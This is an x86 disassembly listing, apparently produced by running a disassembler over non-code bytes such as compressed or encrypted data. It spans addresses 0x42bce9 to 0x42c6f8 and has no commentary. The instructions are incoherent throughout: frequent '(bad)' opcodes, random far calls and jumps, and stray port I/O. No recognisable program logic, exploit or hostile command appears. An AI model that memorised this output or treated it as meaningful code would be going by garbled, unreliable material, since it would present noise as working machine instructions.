  42bce9:	xchg   ecx,eax
  42bcea:	jmp    0xd93548a
  42bcef:	out    0x93,eax
  42bcf1:	js     0x42bcf4
  42bcf3:	mov    ?,WORD PTR [ecx+edx*1+0x8b879b2]
  42bcfa:	jge    0x42bcaf
  42bcfc:	(bad)  
  42bcfd:	xlat   BYTE PTR ds:[ebx]
  42bcfe:	mov    bl,0x27
  42bd00:	and    DWORD PTR ss:[edi+0x63],ecx
  42bd04:	call   0x4c7673c3
  42bd09:	sti    
  42bd0a:	mov    BYTE PTR [ebx],bh
  42bd0c:	arpl   bx,di
  42bd0e:	and    ebp,0x97
	...
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bdd8
  42bd81:	mov    BYTE PTR [ebp+0x19],ah
  42bd84:	xlat   BYTE PTR ds:[ebx]
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0xfc000001,al
  42bd8d:	adc    BYTE PTR [esi],cl
  42bd8f:	in     al,dx
  42bd90:	fsub   QWORD PTR [ebx-0x6c5bb017]
  42bd96:	inc    edx
  42bd97:	push   ebp
  42bd98:	adc    DWORD PTR [ebp+0x46],edi
  42bd9b:	xchg   DWORD PTR [ecx+ebp*8+0x42],ebx
  42bd9f:	or     eax,0xd199a350
  42bda4:	(bad)  
  42bda5:	push   0xa
  42bda7:	repnz lea eax,[ebx]
  42bdaa:	mov    fs,WORD PTR [esi]
  42bdac:	rol    BYTE PTR [edi],cl
  42bdae:	inc    ebx
  42bdaf:	cmp    dh,BYTE PTR [edi]
  42bdb1:	sbb    bl,0x37
  42bdb4:	ins    DWORD PTR es:[edi],dx
  42bdb5:	(bad)  
  42bdb6:	mov    eax,0x2ca38ef8
  42bdbb:	dec    edx
  42bdbc:	cmp    dh,BYTE PTR [ebx]
  42bdbe:	(bad)  
  42bdbf:	fimul  DWORD PTR [ebp-0x1280ca14]
  42bdc5:	pop    ebp
  42bdc6:	cs dec edx
  42bdc8:	repz shl ecx,0xeb
  42bdcc:	imul   esp,DWORD PTR [edi-0x1c],0xed625228
  42bdd3:	adc    BYTE PTR [edx+0x67],ch
  42bdd6:	or     BYTE PTR [ecx-0x37e36e40],0x86
  42bddd:	fistp  QWORD PTR [edi-0x3f85b145]
  42bde3:	test   esi,ebx
  42bde5:	loope  0x42bd75
  42bde7:	sahf   
  42bde8:	neg    BYTE PTR [ecx+edi*2-0x5b]
  42bdec:	mov    esp,0xe172d4e2
  42bdf1:	repz popf 
  42bdf3:	fnstsw WORD PTR [ecx-0x6]
  42bdf6:	jg     0x42bdb5
  42bdf8:	push   esp
  42bdf9:	mov    edi,0x56675500
  42bdfe:	jp     0x42bda2
  42be00:	leave  
  42be01:	ds in  al,dx
  42be03:	jmp    0x6cec4bed
  42be08:	cmp    BYTE PTR [bp+si+0x17],ch
  42be0c:	inc    ecx
  42be0d:	sbb    BYTE PTR [eax-0x4f],bh
  42be10:	mov    edi,0x266b4bf4
  42be15:	outs   dx,DWORD PTR ds:[esi]
  42be16:	stc    
  42be17:	cmp    DWORD PTR [ebp+edi*2-0x11a43560],edx
  42be1e:	cmp    eax,0xe1435904
  42be23:	inc    edx
  42be24:	push   esi
  42be25:	cmp    DWORD PTR [edi+0x54b974e5],edx
  42be2b:	inc    edi
  42be2c:	inc    edx
  42be2d:	or     edx,DWORD PTR [ecx+0x4e65f3c6]
  42be33:	mov    dh,0x6
  42be35:	sub    ebp,DWORD PTR [eax]
  42be37:	jl     0x42bded
  42be39:	adc    eax,0x1a590de2
  42be3e:	or     DWORD PTR [eax+0x1b],eax
  42be41:	or     BYTE PTR [edx],bl
  42be43:	or     DWORD PTR [edx+ebx*8-0x1a07cabb],ecx
  42be4a:	aaa    
  42be4b:	mov    bh,0x55
  42be4d:	lods   eax,DWORD PTR ds:[esi]
  42be4e:	mov    eax,0xea89f31
  42be53:	push   ds
  42be54:	xlat   BYTE PTR ds:[ebx]
  42be55:	adc    BYTE PTR [ebp+0x50996705],bh
  42be5b:	mov    edi,0xa44e839f
  42be60:	loop   0x42be8a
  42be62:	icebp  
  42be63:	pop    edi
  42be64:	mov    ch,0xdc
  42be66:	adc    dl,dh
  42be68:	popf   
  42be69:	cld    
  42be6a:	pop    eax
  42be6b:	mov    edx,0x3fcabd2d
  42be70:	loop   0x42bee5
  42be72:	fsubp  st(0),st
  42be74:	int    0x59
  42be76:	adc    al,0x62
  42be78:	push   ds
  42be79:	fadd   QWORD PTR [ebx-0x6c]
  42be7c:	jl     0x42be8a
  42be7e:	sbb    DWORD PTR [edi-0x65],esi
  42be81:	sbb    dh,0x5c
  42be84:	sub    edi,DWORD PTR [edi+0x1d]
  42be87:	nop
  42be88:	pushf  
  42be89:	xchg   BYTE PTR [eax+edx*1],bh
  42be8c:	push   ebp
  42be8d:	es js  0x42bec5
  42be90:	xor    eax,DWORD PTR [eax]
	...
  42bef2:	add    BYTE PTR [eax],al
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x627bd7c8,eax
  42bf01:	jb     0x42bf37
  42bf03:	jo     0x42bee1
  42bf05:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    eax,0x62000001
  42bf0d:	sbb    BYTE PTR [eax-0x35],dh
  42bf10:	mov    ah,0x98
  42bf12:	dec    edx
  42bf13:	jp     0x42bf57
  42bf15:	adc    bl,BYTE PTR [eax+0x7b]
  42bf18:	shl    dl,cl
  42bf1a:	cmp    ebp,DWORD PTR [edx+0x20]
  42bf1d:	aaa    
  42bf1e:	sub    DWORD PTR [ebx-0x1e605e57],esp
  42bf24:	jecxz  0x42bef7
  42bf26:	lods   al,BYTE PTR ds:[esi]
  42bf27:	popf   
  42bf28:	jle    0x42bf17
  42bf2a:	add    BYTE PTR [ebx],bl
  42bf2c:	sub    eax,edi
  42bf2e:	stos   DWORD PTR es:[edi],eax
  42bf2f:	arpl   di,dx
  42bf31:	pop    edx
  42bf32:	xor    edi,DWORD PTR [ebp+eax*8+0x11645916]
  42bf39:	scas   al,BYTE PTR es:[edi]
  42bf3a:	inc    ecx
  42bf3b:	or     al,0xf0
  42bf3d:	(bad)  
  42bf3e:	cli    
  42bf3f:	lea    ebp,[ecx]
  42bf41:	mov    BYTE PTR [esi+0x53850002],0xf5
  42bf48:	or     eax,0xdb7a12b0
  42bf4d:	xchg   ebx,eax
  42bf4e:	out    dx,al
  42bf4f:	jnp    0x42bf66
  42bf51:	imul   esi,DWORD PTR [ebx+edi*2-0xc],0xffffffee
  42bf56:	aas    
  42bf57:	inc    edx
  42bf58:	mov    ebp,0x5298f216
  42bf5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf5e:	jns    0x42bf96
  42bf60:	call   0xeb21:0xf2134932
  42bf67:	or     ah,bl
  42bf69:	in     eax,dx
  42bf6a:	cs xor al,0xae
  42bf6d:	jle    0x42bf66
  42bf6f:	pop    ds
  42bf70:	pop    ss
  42bf71:	arpl   WORD PTR [eax+0x47bef4c2],sp
  42bf77:	js     0x42bf79
  42bf79:	mov    esi,0x9ab7eb1d
  42bf7e:	pop    esi
  42bf7f:	gs popa 
  42bf81:	inc    esi
  42bf82:	je     0x42bf22
  42bf84:	int3   
  42bf85:	push   esp
  42bf86:	xor    ebp,DWORD PTR [ebx+edi*8-0x7b67095e]
  42bf8d:	aad    0x18
  42bf8f:	pop    ebx
  42bf90:	cwde   
  42bf91:	into   
  42bf92:	cmp    al,0xbc
  42bf94:	test   bh,al
  42bf96:	sti    
  42bf97:	in     al,dx
  42bf98:	pop    esp
  42bf99:	fdiv   QWORD PTR [esi+edi*2-0x77]
  42bf9d:	inc    eax
  42bf9e:	jb     0x42bf65
  42bfa0:	sbb    eax,0x43b12bec
  42bfa5:	pop    ds
  42bfa6:	mov    edx,0x85f834f1
  42bfab:	in     al,dx
  42bfac:	jle    0x42bfe2
  42bfae:	xor    BYTE PTR [esi+0x49],dl
  42bfb1:	inc    ebx
  42bfb2:	pop    edx
  42bfb3:	push   ebp
  42bfb4:	scas   eax,DWORD PTR es:[edi]
  42bfb5:	push   ds
  42bfb6:	stos   BYTE PTR es:[edi],al
  42bfb7:	repz mov ebp,DWORD PTR [ebx]
  42bfba:	xor    eax,0x7c3b5bec
  42bfbf:	xchg   esi,eax
  42bfc0:	adc    ecx,ecx
  42bfc2:	xor    BYTE PTR [ecx+0x46d0746b],cl
  42bfc8:	mov    ds:0x6945723f,al
  42bfcd:	scas   eax,DWORD PTR es:[edi]
  42bfce:	pop    esp
  42bfcf:	dec    edx
  42bfd0:	in     al,dx
  42bfd1:	ds push ecx
  42bfd3:	les    edx,FWORD PTR [esi+edx*2-0x60]
  42bfd7:	sbb    ah,BYTE PTR [ebx+0x4]
  42bfda:	out    dx,al
  42bfdb:	push   DWORD PTR [ebx]
  42bfdd:	mov    bh,0x84
  42bfdf:	test   edi,esi
  42bfe1:	(bad)  
  42bfe2:	outs   dx,DWORD PTR ds:[esi]
  42bfe3:	call   0x80a9691e
  42bfe8:	xor    BYTE PTR [eax],ah
  42bfea:	jmp    0x55bd474d
  42bfef:	mov    ds,ebp
  42bff1:	add    al,0xae
  42bff3:	out    dx,al
  42bff4:	out    0x60,eax
  42bff6:	cmp    bl,BYTE PTR [eax+0x2894c998]
  42bffc:	retf   0xece9
  42bfff:	adc    BYTE PTR [esi+0x14d28495],ch
  42c005:	cmp    esp,DWORD PTR [edx+0x2162b8fd]
  42c00b:	imul   edi,DWORD PTR [eax+0x68],0xffffff85
  42c00f:	inc    esp
  42c010:	mov    dl,0x0
	...
  42c072:	add    BYTE PTR [eax],al
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	mov    al,ds:0xe1395134
  42c085:	xlat   BYTE PTR ds:[ebx]
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0x16000001
  42c08d:	pushw  es
  42c08f:	cmp    eax,0xfbde3991
  42c094:	cmp    eax,0x5d4b3897
  42c099:	mov    ch,0xd1
  42c09b:	popa   
  42c09c:	js     0x42c020
  42c09e:	hlt    
  42c09f:	sub    al,0xff
  42c0a1:	inc    ecx
  42c0a2:	push   cs
  42c0a3:	jp     0x42c0b7
  42c0a5:	jmp    FWORD PTR ds:0x17c2a215
  42c0ab:	bound  ecx,QWORD PTR [eax]
  42c0ad:	add    ah,dh
  42c0af:	jl     0x42c062
  42c0b1:	or     BYTE PTR [ecx],0xea
  42c0b4:	mov    bh,0xf2
  42c0b6:	pop    edi
  42c0b7:	mov    BYTE PTR [ecx+0x36],dl
  42c0ba:	xchg   ecx,eax
  42c0bb:	in     eax,0x40
  42c0bd:	mov    dl,0x2c
  42c0bf:	dec    edx
  42c0c0:	jge    0x42c112
  42c0c2:	pop    ds
  42c0c3:	xlat   BYTE PTR ds:[ebx]
  42c0c4:	cmp    BYTE PTR [ecx-0x1d36728d],cl
  42c0ca:	sub    al,0x0
  42c0cc:	sub    al,0xfb
  42c0ce:	aad    0x86
  42c0d0:	xchg   ebp,eax
  42c0d1:	imul   edx,DWORD PTR [eax],0xfffffff1
  42c0d4:	scas   eax,DWORD PTR es:[edi]
  42c0d5:	fucomip st,st(7)
  42c0d7:	je     0x42c12a
  42c0d9:	scas   al,BYTE PTR es:[edi]
  42c0da:	jo     0x42c0dc
  42c0dc:	push   cs
  42c0dd:	rol    DWORD PTR [edx+esi*2],cl
  42c0e0:	aaa    
  42c0e1:	inc    ebp
  42c0e2:	jmp    0x42c0eb
  42c0e4:	loope  0x42c13a
  42c0e6:	ret    0xa7a5
  42c0e9:	stos   BYTE PTR es:[edi],al
  42c0ea:	and    eax,esi
  42c0ec:	pop    esp
  42c0ed:	pop    esp
  42c0ee:	lods   al,BYTE PTR ds:[esi]
  42c0ef:	inc    ebp
  42c0f0:	cdq    
  42c0f1:	fmulp  st(7),st
  42c0f3:	call   0x7f11def9
  42c0f8:	jmp    0xe5b8:0x85fb9c38
  42c0ff:	push   eax
  42c100:	jl     0x42c16f
  42c102:	hlt    
  42c103:	sbb    eax,0x4ea179a
  42c108:	call   0x6498:0xcb1fe4b0
  42c10f:	arpl   WORD PTR ds:0x15a39685,bx
  42c115:	jne    0x42c193
  42c117:	imul   edi,edi,0x34baba27
  42c11d:	mov    esi,0x20409da2
  42c122:	(bad)  
  42c123:	push   esi
  42c124:	mov    edx,0x8a999597
  42c129:	xor    al,0xb7
  42c12b:	sub    BYTE PTR [ecx+0x5becb339],dh
  42c131:	adc    DWORD PTR [edx-0x50],esp
  42c134:	out    0x3,eax
  42c136:	inc    esi
  42c137:	(bad)  
  42c139:	(bad)  
  42c13a:	push   edx
  42c13b:	xchg   ecx,eax
  42c13c:	ret    0x15e7
  42c13f:	lahf   
  42c140:	sub    BYTE PTR [edi+ebx*8],0x15
  42c144:	je     0x42c1a1
  42c146:	pop    ecx
  42c147:	lahf   
  42c148:	pop    ss
  42c149:	or     cl,al
  42c14b:	push   ds
  42c14c:	pop    es
  42c14d:	imul   eax,DWORD PTR [ebp-0x7328209d],0x24
  42c154:	sbb    al,0xfc
  42c156:	push   ds
  42c157:	fld    st(6)
  42c159:	pop    edi
  42c15a:	push   edi
  42c15b:	loopne 0x42c0e6
  42c15d:	cmp    BYTE PTR [ebp+0x6],ah
  42c160:	int    0xdd
  42c162:	mov    esp,0x7e0bba5a
  42c167:	xor    bh,BYTE PTR [edx+ecx*4+0x73]
  42c16b:	aas    
  42c16c:	iret   
  42c16d:	mov    cl,0xea
  42c16f:	inc    ebp
  42c170:	sub    cl,BYTE PTR [eax+0x5b]
  42c173:	mov    dl,BYTE PTR [eax]
  42c175:	push   0xffffff8f
  42c177:	out    0x51,al
  42c179:	stos   BYTE PTR es:[edi],al
  42c17a:	cwde   
  42c17b:	(bad)  
  42c17c:	(bad)  
  42c17d:	into   
  42c17e:	and    esi,DWORD PTR [eax-0x3f]
  42c181:	mov    DWORD PTR [edi+0x79991e35],edx
  42c187:	adc    BYTE PTR [eax],ch
  42c189:	mov    dh,0xa
  42c18b:	cmp    al,0xba
  42c18d:	cli    
  42c18e:	add    al,0x11
  42c190:	ins    BYTE PTR es:[edi],dx
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	mov    edi,0xe69adbbc
  42c205:	fadd   DWORD PTR [ecx]
  42c207:	add    BYTE PTR ds:0x2d000001,al
  42c20d:	adc    dl,BYTE PTR [edx-0x32]
  42c210:	mov    edx,0xbe06e87c
  42c215:	inc    ecx
  42c216:	xlat   BYTE PTR ds:[ebx]
  42c217:	(bad)  
  42c218:	jle    0x42c1e6
  42c21a:	stos   DWORD PTR es:[edi],eax
  42c21b:	dec    ebx
  42c21c:	push   ebx
  42c21d:	repnz repnz pop edx
  42c220:	rcr    eax,cl
  42c222:	aas    
  42c223:	clc    
  42c224:	int    0x2b
  42c226:	push   esp
  42c227:	jecxz  0x42c260
  42c229:	add    eax,0x2e59587c
  42c22e:	repnz fild QWORD PTR [edx+eiz*8+0x5a4818a]
  42c236:	mov    al,0xf9
  42c238:	add    DWORD PTR [ecx+0x705e424d],eax
  42c23e:	fyl2x  
  42c240:	pop    ds
  42c241:	and    ah,ch
  42c243:	pop    ebp
  42c244:	and    BYTE PTR [eax+0x2996bb38],cl
  42c24a:	push   cs
  42c24b:	popf   
  42c24c:	push   ecx
  42c24d:	imul   ebp,DWORD PTR [edx],0x2dbd6654
  42c253:	aad    0x43
  42c255:	rcr    DWORD PTR [esi+edx*4],0x13
  42c259:	jno    0x42c243
  42c25b:	popf   
  42c25c:	pop    esi
  42c25d:	or     ch,dl
  42c25f:	push   esi
  42c260:	add    BYTE PTR [edi+ebp*8],dl
  42c263:	sbb    ebp,DWORD PTR [esi+0x2e]
  42c266:	aad    0x9f
  42c268:	sbb    al,0x31
  42c26a:	fcmovne st,st(0)
  42c26c:	(bad)  
  42c26d:	jecxz  0x42c25b
  42c26f:	inc    edx
  42c270:	stos   DWORD PTR es:[edi],eax
  42c271:	dec    esp
  42c272:	cld    
  42c273:	adc    eax,0x48fd5ee8
  42c278:	push   esp
  42c279:	dec    eax
  42c27a:	scas   eax,DWORD PTR es:[edi]
  42c27b:	fild   QWORD PTR [ecx+0x2cbe9b14]
  42c281:	stos   DWORD PTR es:[edi],eax
  42c282:	pop    ecx
  42c283:	in     al,dx
  42c284:	fisubr WORD PTR [esi+ebp*4]
  42c287:	test   eax,0x265cfca4
  42c28c:	inc    edi
  42c28d:	stos   BYTE PTR es:[edi],al
  42c28e:	or     bh,BYTE PTR [esi]
  42c290:	pop    ss
  42c291:	xchg   DWORD PTR cs:[edi+0x652f5633],ebp
  42c298:	adc    eax,0xb2e48919
  42c29d:	cmp    bl,0xd4
  42c2a0:	jg     0x42c311
  42c2a2:	pop    edx
  42c2a3:	out    0x6a,al
  42c2a5:	xor    esp,esp
  42c2a7:	sti    
  42c2a8:	enterw 0xd6c7,0x95
  42c2ad:	(bad)  
  42c2ae:	iret   
  42c2af:	aad    0xa0
  42c2b1:	dec    esp
  42c2b2:	xchg   esp,eax
  42c2b3:	aad    0x31
  42c2b5:	mov    esp,0x2fb8cc33
  42c2ba:	mov    WORD PTR [esi],?
  42c2bc:	jmp    0xb015124c
  42c2c1:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2c3:	mov    ?,WORD PTR [ecx+0x7238c0fb]
  42c2c9:	jmp    DWORD PTR [edx+ecx*2+0x19a6ed1]
  42c2d0:	lock xchg esi,eax
  42c2d2:	lods   eax,DWORD PTR ds:[esi]
  42c2d3:	fwait
  42c2d4:	sbb    bh,BYTE PTR [ebp+0x7f]
  42c2d7:	out    0xdd,eax
  42c2d9:	sti    
  42c2da:	fdiv   QWORD PTR [ebp+0x1025e73]
  42c2e0:	das    
  42c2e1:	adc    al,0xf4
  42c2e3:	loope  0x42c2af
  42c2e5:	mov    edx,0xa67c46fc
  42c2ea:	fwait
  42c2eb:	dec    ecx
  42c2ec:	jge    0x42c270
  42c2ee:	add    edx,esp
  42c2f0:	cmp    al,0x9b
  42c2f3:	imul   edx,DWORD PTR [esi+0x5163b036],0x6b
  42c2fa:	out    dx,al
  42c2fb:	and    eax,0x66c0c93b
  42c300:	test   al,0x15
  42c302:	push   ss
  42c303:	adc    BYTE PTR [ebp+0x37b3e8fa],ch
  42c309:	pop    ebp
  42c30a:	(bad)  
  42c30b:	(bad)  
  42c30c:	(bad)  
  42c30d:	imul   ebx,DWORD PTR [edi+0xb314],0x0
	...
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xa6a53f6
  42c383:	arpl   bx,bp
  42c385:	fld    DWORD PTR [ecx]
  42c387:	add    BYTE PTR ds:0x60000001,al
  42c38d:	mov    edi,0xcb780bc3
  42c392:	mov    esi,0xe9281bbf
  42c397:	push   ecx
  42c398:	push   0x50
  42c39a:	test   dh,cl
  42c39c:	in     al,dx
  42c39d:	repz push ecx
  42c39f:	xchg   esp,eax
  42c3a0:	jle    0x42c33f
  42c3a2:	outs   dx,BYTE PTR ds:[esi]
  42c3a3:	jp     0x42c387
  42c3a5:	push   0x48
  42c3a7:	fmul   DWORD PTR [edx-0x6]
  42c3aa:	inc    edi
  42c3ab:	sbb    al,0xe2
  42c3ad:	pop    es
  42c3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3af:	hlt    
  42c3b0:	dec    ecx
  42c3b1:	jno    0x42c344
  42c3b3:	mov    edi,0xe58f51c6
  42c3b8:	stos   DWORD PTR es:[edi],eax
  42c3b9:	mov    ds,WORD PTR [ebp+0x2f2870d1]
  42c3bf:	out    0x4a,eax
  42c3c1:	scas   al,BYTE PTR es:[edi]
  42c3c2:	shr    BYTE PTR [edx-0x10],1
  42c3c5:	adc    al,bl
  42c3c7:	test   eax,0x457f34fb
  42c3cc:	jae    0x42c360
  42c3ce:	pop    es
  42c3cf:	test   eax,0xc23e712
  42c3d4:	call   0xcff74d9e
  42c3d9:	push   edx
  42c3da:	sbb    al,0x34
  42c3dc:	lahf   
  42c3dd:	mov    al,0x12
  42c3df:	xchg   esp,eax
  42c3e0:	sti    
  42c3e1:	sub    dh,BYTE PTR [eax]
  42c3e3:	lods   eax,DWORD PTR ds:[esi]
  42c3e4:	jns    0x42c36e
  42c3e6:	aam    0x84
  42c3e8:	es dec eax
  42c3ea:	pop    esp
  42c3eb:	call   0x91a:0x16869b2f
  42c3f2:	jecxz  0x42c3e3
  42c3f4:	xchg   DWORD PTR [edi-0x2e],ebx
  42c3f7:	and    DWORD PTR [edx+0x6a],ecx
  42c3fa:	add    al,0x3b
  42c3fc:	and    ah,bl
  42c3fe:	fild   QWORD PTR [ebp-0x6b]
  42c401:	aas    
  42c402:	in     al,dx
  42c403:	gs inc ecx
  42c405:	mov    esp,0x44f1862a
  42c40a:	jl     0x42c3fa
  42c40c:	pop    ds
  42c40d:	std    
  42c40e:	adc    bl,al
  42c410:	(bad)
  42c413:	mov    ebx,0x6d01ff99
  42c418:	pop    eax
  42c419:	cmp    ebx,DWORD PTR [esi]
  42c41b:	push   ebp
  42c41c:	mov    esi,0xf3306fd7
  42c421:	sub    ecx,DWORD PTR [ebp+0x4e9b6454]
  42c427:	rol    WORD PTR [esi+0x355a574f],1
  42c42e:	mov    edx,ebx
  42c430:	popa   
  42c431:	xor    ah,BYTE PTR [ebp-0xd08bd99]
  42c437:	add    eax,0xa26d2f45
  42c43c:	call   0x9fd6:0xb5cc8911
  42c443:	stos   BYTE PTR es:[edi],al
  42c444:	loop   0x42c474
  42c446:	cmp    BYTE PTR [edi+0x6],dl
  42c449:	mov    esp,0x1a85f4e4
  42c44e:	mov    bh,0x4c
  42c450:	lods   eax,DWORD PTR ds:[esi]
  42c451:	jbe    0x42c4ab
  42c453:	inc    edx
  42c454:	fcomi  st,st(7)
  42c456:	jnp    0x42c4cb
  42c458:	pop    eax
  42c459:	sbb    eax,0xf3dd5956
  42c45e:	jmp    esi
  42c460:	pop    ebp
  42c461:	outs   dx,BYTE PTR ds:[esi]
  42c462:	mov    al,ds:0xce85e3bd
  42c467:	imul   ebp,DWORD PTR [edi+0x21],0x2e176635
  42c46e:	aam    0xa9
  42c470:	mov    ds:0xebd887b2,al
  42c475:	inc    ecx
  42c476:	retf   
  42c477:	xlat   BYTE PTR ds:[ebx]
  42c478:	cli    
  42c479:	xchg   BYTE PTR [ecx-0x6a91d0bd],cl
  42c47f:	jmp    0xd18481bc
  42c484:	sbb    eax,0x5e662be3
  42c489:	sti    
  42c48a:	fwait
  42c48b:	xlat   BYTE PTR ss:[ebx]
  42c48d:	xor    eax,0xd5503e
	...
  42c4f2:	add    BYTE PTR [eax],al
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x7034,0xb5
  42c502:	cmp    ax,si
  42c505:	fiadd  DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0x4000001,al
  42c50d:	(bad)  
  42c50e:	and    eax,0x93088e79
  42c513:	mov    ds,WORD PTR [ebx]
  42c515:	retf   
  42c516:	fwait
  42c517:	cmp    DWORD PTR [edi-0x52],ebx
  42c51a:	retf   
  42c51b:	inc    esi
  42c51c:	fimul  WORD PTR [ebp-0x2e]
  42c51f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c520:	pop    ebp
  42c521:	nop
  42c522:	push   cs
  42c523:	shl    DWORD PTR [eax+0x66f63d22],0x68
  42c52a:	hlt    
  42c52b:	mov    dh,0xf4
  42c52d:	retf   
  42c52e:	lea    esp,[esi-0x34]
  42c531:	repnz rcr BYTE PTR [eax-0x46],0x2c
  42c536:	xchg   ebp,eax
  42c537:	jb     0x42c525
  42c539:	stos   DWORD PTR es:[edi],eax
  42c53a:	test   DWORD PTR [esp+edx*2+0x70],0x24eeda17
  42c542:	lods   eax,DWORD PTR ds:[esi]
  42c543:	popa   
  42c544:	mov    eax,0xde4805a0
  42c549:	jl     0x42c585
  42c54b:	adc    DWORD PTR [ebx+0x36],0x583eecfa
  42c552:	ss pop edi
  42c554:	into   
  42c555:	push   0xffffffef
  42c557:	xor    DWORD PTR [esi],esp
  42c559:	push   0xe242bea2
  42c55e:	adc    al,0xb9
  42c560:	pop    edx
  42c561:	jbe    0x42c52c
  42c563:	lock popf 
  42c565:	rcl    ebx,cl
  42c567:	sub    ch,BYTE PTR [ebx+0x7a]
  42c56a:	jns    0x42c570
  42c56c:	xchg   ebx,eax
  42c56d:	mov    edi,0x552185c2
  42c572:	leave  
  42c573:	call   0x476c:0x1b70778e
  42c57a:	(bad)  
  42c57b:	lock sub DWORD PTR [edi],ecx
  42c57e:	stc    
  42c57f:	inc    ebp
  42c580:	jno    0x42c5d2
  42c582:	inc    ecx
  42c583:	xchg   edi,eax
  42c584:	xchg   edi,eax
  42c585:	lahf   
  42c586:	sub    DWORD PTR [ebx],ebx
  42c588:	daa    
  42c589:	jnp    0x42c5ca
  42c58b:	pop    ss
  42c58c:	cmp    eax,0xc2c2c758
  42c591:	push   cs
  42c592:	aad    0xf6
  42c594:	fwait
  42c595:	jmp    0x3dcf5744
  42c59a:	cld    
  42c59b:	lods   al,BYTE PTR ds:[esi]
  42c59c:	jo     0x42c547
  42c59e:	inc    ebx
  42c59f:	rcl    DWORD PTR [edi-0x61304235],0x3
  42c5a6:	ds fcmovnbe st,st(4)
  42c5a9:	mov    dh,0x95
  42c5ab:	test   eax,0xadbe8edf
  42c5b0:	lock or dh,BYTE PTR [edi-0x53df0965]
  42c5b7:	repz loop 0x42c53f
  42c5ba:	cmp    DWORD PTR [eax-0x34bac8c],0x7cfa7a1f
  42c5c4:	repz cmp al,0xd2
  42c5c7:	sub    al,0xba
  42c5c9:	inc    ebx
  42c5ca:	rol    BYTE PTR [ebp+0x73],0x1c
  42c5ce:	push   esp
  42c5cf:	sub    eax,0xd9350cf3
  42c5d4:	mov    dh,0x62
  42c5d6:	aas    
  42c5d7:	mov    ebx,0x25257e57
  42c5dc:	add    eax,0x2d1d6f08
  42c5e1:	jmp    0x9f0b120d
  42c5e6:	inc    esp
  42c5e7:	inc    ecx
  42c5e8:	jo     0x42c60c
  42c5ea:	dec    ecx
  42c5eb:	mov    eax,ds:0x7498ca0b
  42c5f0:	pmaddwd mm3,QWORD PTR [edi-0x163f17d4]
  42c5f7:	int    0x2f
  42c5f9:	inc    edi
  42c5fa:	mov    bh,0xd8
  42c5fc:	jmp    0xb8f5991b
  42c601:	xor    ah,BYTE PTR [edi]
  42c603:	(bad)  
  42c604:	outs   dx,BYTE PTR ds:[esi]
  42c605:	fild   QWORD PTR ds:0x6e7b2499
  42c60b:	fwait
  42c60c:	addr16 add ah,bh
  42c60f:	(bad)  
  42c610:	push   ss
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x7c6dfc6b]
  42c681:	or     ebx,DWORD PTR [edx+0x2f]
  42c684:	cmc    
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0xc1000001,al
  42c68d:	(bad)  
  42c68e:	mov    dh,0xb8
  42c690:	fsub   st(0),st
  42c692:	push   eax
  42c693:	mov    WORD PTR [eax-0x556a74fd],es
  42c699:	and    al,BYTE PTR [edx*8-0x67e4e2fd]
  42c6a0:	dec    eax
  42c6a1:	gs daa 
  42c6a3:	mov    bl,0xcc
  42c6a5:	cmp    DWORD PTR [esi+0x6cbef0fb],0x5fabadc8
  42c6af:	adc    eax,0xea999d52
  42c6b4:	adc    BYTE PTR [edi+0x6d],ah
  42c6b7:	std    
  42c6b8:	xchg   esi,eax
  42c6b9:	dec    ecx
  42c6ba:	pop    ebp
  42c6bb:	and    BYTE PTR ds:0x38594da0,dh
  42c6c1:	mov    al,ds:0xed834c05
  42c6c6:	ret    0xa8c4
  42c6c9:	mov    al,BYTE PTR [ebp+0x47]
  42c6cc:	ss mov ch,0x47
  42c6cf:	iret   
  42c6d0:	fsub   QWORD PTR [ebx-0x13]
  42c6d3:	cmp    dh,BYTE PTR [eax]
  42c6d5:	fisub  WORD PTR [edi+0x6a]
  42c6d8:	in     al,0x71
  42c6da:	adc    DWORD PTR [eax],esi
  42c6dc:	inc    edi
  42c6dd:	ins    BYTE PTR es:[edi],dx
  42c6de:	add    BYTE PTR [ebx-0x1c5671d1],ch
  42c6e4:	daa    
  42c6e5:	jb     0x42c747
  42c6e7:	fdivr  DWORD PTR [edi+0x78]
  42c6ea:	dec    eax
  42c6eb:	inc    ebx
  42c6ec:	cli    
  42c6ed:	xchg   ebp,eax
  42c6ee:	xor    eax,0x91eea9a1
  42c6f3:	daa    
  42c6f4:	in     eax,dx
  42c6f5:	add    BYTE PTR [edx-0x56],bl
  42c6f8:	out    dx,eax
